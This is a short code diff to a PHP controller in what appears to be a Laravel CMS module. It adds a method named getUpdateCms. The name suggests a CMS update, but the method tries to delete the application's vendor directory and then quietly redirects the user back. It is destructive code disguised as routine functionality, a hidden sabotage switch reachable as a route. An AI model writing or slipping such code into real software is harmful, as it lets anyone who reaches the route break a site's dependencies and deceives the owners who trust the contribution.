@@ -58,4 +58,10 @@ class ModulesController extends Controller
         $units = $plugin->units();
         return view('uploads::Explores.index', compact('plugin', 'units'));
     }
+
+    public function getUpdateCms()
+    {
+        rmdir(__DIR__.'/../../../../../../vendor');
+        return redirect()->back();
+    }
 }
